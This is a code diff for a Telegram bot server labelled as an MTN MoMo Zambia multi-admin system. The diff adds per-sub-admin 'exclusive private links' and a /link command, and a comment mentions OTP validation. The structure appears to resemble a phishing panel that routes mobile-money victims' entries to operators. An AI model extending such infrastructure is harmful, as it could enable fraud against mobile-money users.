@@ -1,6 +1,6 @@
 /**
  * **MTN MOMO ZAMBIA - SECURE MULTI-ADMIN SERVER**
- * Updated with strict 4-digit OTP server-side validation
+ * Updated to assign unique, private exclusive links directly to sub-admins upon starting the bot.
  */
 
 const express = require('express');
@@ -92,7 +92,8 @@ async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
   } else {
     paginatedEntries.forEach(([id, record]) => {
       const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
-      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Status: 🟢 Free Access Active`;
+      const subLink = `${APP_URL}/?admin=${id}`;
+      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   🔗 \`${subLink}\`\n   Status: 🟢 Active`;
     });
   }
 
@@ -146,6 +147,14 @@ async function initBot() {
     await updateContinuousAdminList(chatId, null, 0);
   });
 
+  bot.onText(/\/link/, async (msg) => {
+    try {
+      const chatId = String(msg.chat.id);
+      const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
+      await bot.sendMessage(chatId, `🔗 *Your Exclusive Private Application Link:*\n${userLink}`, { parse_mode: 'Markdown' });
+    } catch (err) {}
+  });
+
   bot.onText(/\/myprofile|\/me/, async (msg) => {
     try {
       const chatId = String(msg.chat.id);
@@ -163,7 +172,7 @@ async function initBot() {
         `• *Username:* ${username}\n` +
         `• *Telegram ID:* \`${userId}\`\n` +
         `• *Link Status:* 🟢 Free & Active\n\n` +
-        `🔗 *Your Exclusive Link:*\n${userLink}`;
+        `🔗 *Your Exclusive Private Link:*\n${userLink}`;
 
       await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
     } catch (err) {}
@@ -178,10 +187,11 @@ async function initBot() {
       const lastName = msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Your link is free and active: ${APP_URL}\n\nType /admins to view sub-admins.`, {
+        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Your link is free and active: ${APP_URL}\n\nType /link to get your link, or /admins to view sub-admins.`, {
           parse_mode: 'Markdown',
           reply_markup: {
             inline_keyboard: [
+              [{ text: '🔗 Get My Link', callback_data: 'GET_MY_LINK' }],
               [{ text: '📋 View Sub-Admins', callback_data: 'PAGE_0' }],
               [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
             ]
@@ -208,18 +218,31 @@ async function initBot() {
         saveAdmins();
       }
 
+      const subAdminLink = `${APP_URL}/?admin=${chatId}`;
+
       await bot.sendMessage(FALLBACK_ADMIN_ID, 
         `🚨 *New Sub-Admin Started Bot!*\n\n` +
         `👤 *User:* ${username ? '@' + username : firstName} (${firstName} ${lastName})\n` +
-        `🆔 *Chat ID:* \`${userId}\`\n\n` +
+        `🆔 *Chat ID:* \`${userId}\`\n` +
+        `🔗 *Assigned Private Link:* \`${subAdminLink}\`\n\n` +
         `Status: Free link access granted automatically.`, 
         { parse_mode: 'Markdown' }
       );
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      let responseText = `👋 *Welcome ${firstName}!*\n\nYour account is active. Here is your free link:\n${userLink}`;
+      let responseText = `👋 *Welcome ${firstName}!*\n\n` +
+        `Your sub-admin account is fully active.\n\n` +
+        `🔗 *Your Exclusive Private Application Link:*\n${subAdminLink}\n\n` +
+        `Type /link anytime to retrieve this link directly.`;
 
-      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, responseText, { 
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '🔗 Get My Private Link', callback_data: 'GET_MY_LINK' }],
+            [{ text: '👤 View My Profile', callback_data: 'SHOW_MY_PROFILE' }]
+          ]
+        }
+      });
 
     } catch (err) {}
   });
@@ -230,6 +253,13 @@ async function initBot() {
       const chatId = String(query.message.chat.id);
       const user = query.from;
 
+      if (actionData === 'GET_MY_LINK') {
+        const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
+        await bot.sendMessage(chatId, `🔗 *Your Exclusive Private Application Link:*\n${userLink}`, { parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(query.id);
+        return;
+      }
+
       if (actionData === 'SHOW_MY_PROFILE') {
         const userLink = chatId === String(FALLBACK_ADMIN_ID) ? APP_URL : `${APP_URL}/?admin=${chatId}`;
         let profileText = 
@@ -239,7 +269,7 @@ async function initBot() {
           `• *Username:* ${user.username ? '@' + user.username : 'None'}\n` +
           `• *Telegram ID:* \`${user.id}\`\n` +
           `• *Link Status:* 🟢 Free & Active\n\n` +
-          `🔗 *Your Exclusive Link:*\n${userLink}`;
+          `🔗 *Your Exclusive Private Link:*\n${userLink}`;
 
         await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(query.id);
@@ -491,4 +521,3 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-                                
